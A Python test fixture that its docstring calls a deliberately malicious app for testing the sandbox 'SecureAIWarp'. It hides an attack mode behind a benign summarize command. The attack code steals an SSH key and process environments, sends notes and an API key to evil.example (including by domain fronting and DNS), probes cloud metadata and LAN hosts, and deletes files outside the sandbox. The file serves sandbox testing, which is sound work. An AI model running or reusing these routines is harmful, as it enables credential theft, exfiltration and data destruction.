#!/usr/bin/env python3
"""A deliberately malicious example app for the SecureAIWarp end-to-end tests.

    python3 app.py summarize          behaves exactly like notes-app (this is
                                      what the author's tests and the record
                                      run see)
    python3 app.py attack [options]   tries to do harm; every attempt is
                                      reported as one JSON line
                                      {"attack": ..., "succeeded": bool, ...}

The attack mode models "harmless during review, malicious after delivery":
steal a credential file, exfiltrate the picked files to an undeclared host,
obtain the real API key, reach host-local / LAN / metadata addresses
(including a declared host whose DNS answer points at loopback) and write or
delete files outside its sandbox. Under `warp enforce` every attempt must fail.
DO NOT run this outside a shell.
"""
import argparse
import glob
import json
import os
import shutil
import socket
import ssl
import sys
import urllib.request

API = "https://api.notes.example/v1/summarize"
REPORT = []


def report(name, succeeded, detail=""):
    line = {"attack": name, "succeeded": bool(succeeded), "detail": str(detail)[:300]}
    REPORT.append(line)
    print(json.dumps(line, ensure_ascii=False), flush=True)


def http(url, data=None, headers=None, timeout=8):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method="POST" if data else "GET")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read().decode("utf-8", "replace")


def attempt(name, fn):
    try:
        ok, detail = fn()
        report(name, ok, detail)
    except Exception as e:  # blocked attempts surface as exceptions
        report(name, False, "%s: %s" % (type(e).__name__, e))


def picked_text():
    d = os.environ.get("WARP_PICK_NOTES", "")
    out = []
    for p in sorted(glob.glob(os.path.join(d, "*"))):
        with open(p, encoding="utf-8") as f:
            out.append(f.read())
    return "\n".join(out)


def summarize():
    body = json.dumps({"chars": len(picked_text())}).encode()
    st, text = http(API, body, {"content-type": "application/json", "x-api-key": os.environ.get("NOTES_API_KEY", "")})
    with open(os.path.join(os.environ["APP_DATA"], "summary.json"), "w") as f:
        f.write(text)
    for url in ("https://status.notes.example/ping", "https://cdn.notes.example/asset.js"):
        try:  # checks the author also exercised in tests
            http(url, timeout=4)
        except Exception:
            pass
    print("summary ok:", st)


def attack(a):
    key = os.environ.get("NOTES_API_KEY", "")
    loot = picked_text()

    # 1. credentials outside the sandbox
    def read_file(p):
        with open(p) as f:
            return True, f.read()[:60]
    attempt("read_decoy_credential", lambda: read_file(a.decoy))
    attempt("read_host_home_ssh", lambda: read_file(os.path.join(a.host_home, ".ssh", "id_rsa")))
    attempt("list_host_dir", lambda: (True, os.listdir(a.victim_dir)))

    # 2. exfiltration to undeclared destinations
    attempt("exfil_https_undeclared", lambda: (http("https://evil.example/collect", loot.encode())[0] == 200, "sent"))
    attempt("exfil_http_undeclared", lambda: (http("http://evil.example/collect", loot.encode())[0] == 200, "sent"))
    attempt("exfil_declared_host_other_port", lambda: (http("http://api.notes.example:80/collect", loot.encode())[0] == 200, "sent"))

    def direct():
        s = socket.create_connection((a.upstream_ip, 443), timeout=4)
        s.close()
        return True, "connected directly"
    attempt("exfil_direct_socket", direct)
    def fronted(sni, payload):
        # CONNECT to an allowed, non-inspected host but present another
        # server name inside TLS (domain fronting).
        proxy = os.environ.get("HTTPS_PROXY", "http://127.0.0.1:3128").rsplit("/", 1)[-1]
        host, port = proxy.rsplit(":", 1)
        s = socket.create_connection((host, int(port)), timeout=6)
        s.sendall(b"CONNECT cdn.notes.example:443 HTTP/1.1\r\nHost: cdn.notes.example:443\r\n\r\n")
        head = s.recv(4096)
        if b" 200 " not in head.split(b"\r\n", 1)[0]:
            return False, head[:80]
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        t = ctx.wrap_socket(s, server_hostname=sni)
        if payload:
            t.sendall(("POST /collect HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s" % (sni, len(payload), payload)).encode())
        else:
            t.sendall(("GET /asset.js HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n" % sni).encode())
        resp = t.recv(4096)
        t.close()
        return resp.startswith(b"HTTP/1.1 200"), resp[:80]
    attempt("exfil_domain_fronting", lambda: fronted("evil.example", loot))
    try:
        ok, detail = fronted("cdn.notes.example", "")
        print(json.dumps({"control": "tunnel", "ok": ok, "detail": str(detail)}), flush=True)
    except Exception as e:
        print(json.dumps({"control": "tunnel", "ok": False, "detail": str(e)}), flush=True)
    attempt("exfil_dns_lookup", lambda: (True, socket.getaddrinfo("leak-%d.evil.example" % len(loot), 443)))

    # 3. obtain the real API key
    attempt("secret_env_is_real", lambda: (not key.startswith("warp-placeholder-"), key))
    def reflected():
        # The API echoes request headers back; a leak shows up as an
        # x-api-key value other than the placeholder this app sent.
        text = http("https://api.notes.example/echo-headers", headers={"x-api-key": key})[1]
        seen = json.loads(text).get("X-Api-Key", [])
        return any(v != key for v in seen), text
    attempt("secret_reflected_by_api", reflected)
    attempt("secret_to_undeclared_host", lambda: (http("https://evil.example/key", key.encode(), {"x-api-key": key})[0] == 200, "sent"))

    def proc_env():
        found = []
        for p in glob.glob("/proc/*/environ"):
            try:
                with open(p, "rb") as f:
                    found.append(f.read().decode("utf-8", "replace"))
            except OSError:
                pass
        return False, " | ".join(found)  # the test greps this output for the real key
    attempt("secret_proc_environ", proc_env)
    attempt("read_init_environ", lambda: read_file("/proc/1/environ"))

    # 4. host-local, LAN and metadata addresses
    attempt("cloud_metadata", lambda: (http("http://169.254.169.254/latest/meta-data/")[0] == 200, "reached"))
    attempt("host_loopback_service", lambda: (a.host_marker in http(a.host_service)[1], "reached"))
    attempt("lan_by_name", lambda: (http("http://lan.notes.example/")[0] == 200, "reached"))
    attempt("lan_by_ip", lambda: (http("http://192.168.1.1/")[0] == 200, "reached"))
    attempt("rebinding_declared_host", lambda: (http("https://status.notes.example/ping")[0] == 200, "reached"))

    def loop_direct():
        port = int(a.host_service.rsplit(":", 1)[1].split("/")[0])
        s = socket.create_connection(("127.0.0.1", port), timeout=3)
        s.close()
        return True, "connected"
    attempt("host_loopback_direct", loop_direct)

    # 5. write / delete outside the sandbox
    def write(p):
        with open(p, "w") as f:
            f.write("pwned")
        return True, p
    attempt("write_outside", lambda: write(os.path.join(a.victim_dir, "pwned.txt")))
    attempt("write_app_dir", lambda: write("/app/pwned.txt"))
    attempt("delete_outside", lambda: (os.remove(a.victim) is None, a.victim))
    attempt("rmtree_outside", lambda: (shutil.rmtree(a.victim_dir) is None, a.victim_dir))

    print("ATTACK-SUMMARY " + json.dumps({"attempted": len(REPORT), "succeeded": sum(r["succeeded"] for r in REPORT)}))


if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("cmd", choices=["summarize", "attack"])
    p.add_argument("--decoy", default="")
    p.add_argument("--host-home", default="/root")
    p.add_argument("--victim", default="")
    p.add_argument("--victim-dir", default="")
    p.add_argument("--host-service", default="http://127.0.0.1:1/")
    p.add_argument("--host-marker", default="")
    p.add_argument("--upstream-ip", default="1.2.3.4")
    a = p.parse_args()
    if a.cmd == "summarize":
        summarize()
    else:
        attack(a)
    sys.exit(0)
